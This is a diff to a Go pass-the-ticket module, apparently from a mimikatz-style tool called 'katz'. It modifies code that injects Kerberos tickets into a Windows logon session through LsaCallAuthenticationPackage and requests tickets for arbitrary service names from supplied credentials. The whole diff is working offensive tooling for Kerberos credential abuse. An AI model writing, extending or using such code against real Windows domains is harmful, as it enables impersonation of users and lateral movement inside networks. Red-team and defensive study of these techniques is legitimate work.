@@ -2,7 +2,6 @@ package ptt
 
 import (
 	"fmt"
-	"strings"
 	"unsafe"
 
 	handleHelpers "katz/katz/modules/kerb/ticketdump"
@@ -23,6 +22,7 @@ var (
 	procLsaLookupAuthenticationPackage = modSecur32.NewProc("LsaLookupAuthenticationPackage")
 	procGetLastError              = modKernel32.NewProc("GetLastError")
 	procFormatMessage			  = modKernel32.NewProc("FormatMessageW")
+	procLocalFree				  = modKernel32.NewProc("LocalFree")
 )
 
 func PttMinimal() error {
@@ -106,7 +106,7 @@ func LastError() string {
 	}
 	return fmt.Sprintf("Error %d: %s", errorCode, windows.UTF16ToString(messageBuffer[:]))
 }
-func Ptt(ticket []byte, handle windows.Handle, currLUID windows.LUID) error {
+func Ptt(ticket []byte, handle windows.Handle, currLUID windows.LUID) (error, uintptr) {
 	// handle, err := handleHelpers.GetLsaHandle() // Assume this function gets a valid LSA handle
 	// if err != nil {
 
@@ -118,12 +118,12 @@ func Ptt(ticket []byte, handle windows.Handle, currLUID windows.LUID) error {
 	// 	return err
 	// }
 	// Ensure ticket fits within max buffer size
-
+	var responsePtr uintptr
 	if len(ticket) > 4096 {
 
-		return fmt.Errorf("ticket size exceeds allowed limit")
+		return fmt.Errorf("ticket size exceeds allowed limit"), responsePtr
 	}
-
+	
 	kerb := handleHelpers.NewLSAString("kerberos")
 	pkgName, _ := handleHelpers.GetAuthenticationPackage(handle, kerb)
 	var submitRequest KERB_SUBMIT_TKT_REQUEST
@@ -137,7 +137,7 @@ func Ptt(ticket []byte, handle windows.Handle, currLUID windows.LUID) error {
 	// Calculate the size of the entire request structure
 	requestSize := uint32(unsafe.Sizeof(submitRequest))
 
-	var responsePtr uintptr
+	
 	var returnLength uint32
 	var protocolStatus uint32
 	// Call the LsaCallAuthenticationPackage function
@@ -160,17 +160,17 @@ func Ptt(ticket []byte, handle windows.Handle, currLUID windows.LUID) error {
 
 	if status != 0 {
 		fmt.Printf("0x%x\n", status)
-		return fmt.Errorf("LsaCallAuthenticationPackage failed with status: 0x%x", status)
+		return fmt.Errorf("LsaCallAuthenticationPackage failed with status: 0x%x", status), responsePtr
 
 	}
 	// fmt.Printf("Status: 0x%x\n", protocolStatus)
 
-	return nil
+	return nil, responsePtr
 }
 
 
 
-func TGT(domain, username, password string) ([]byte, error) {
+func TGT(domain, username, password, targetName string) ([]byte, error) {
 	var credHandle SECURITY_HANDLE
 	var timeStamp TimeStamp
 
@@ -203,7 +203,6 @@ func TGT(domain, username, password string) ([]byte, error) {
 		return nil, fmt.Errorf("AcquireCredentialsHandleA failed: status=0x%x, winErr=0x%x, err=%v", status, winErr, errCall)
 	}
 
-	targetName := fmt.Sprintf("krbtgt/%s", strings.ToUpper(domain))
 	targetPtr := stringToAnsiPointer(targetName)
 
 	var outBuf SecBuffer
@@ -247,4 +246,8 @@ func TGT(domain, username, password string) ([]byte, error) {
 	ticketData := unsafe.Slice((*byte)(unsafe.Pointer(outBuf.pvBuffer)), outBuf.cbBuffer)
 	ticketCopy := append([]byte(nil), ticketData...)
 	return ticketCopy, nil
+}
+
+func Cleanup(ptr uintptr) {
+	procLocalFree.Call(ptr)
 }
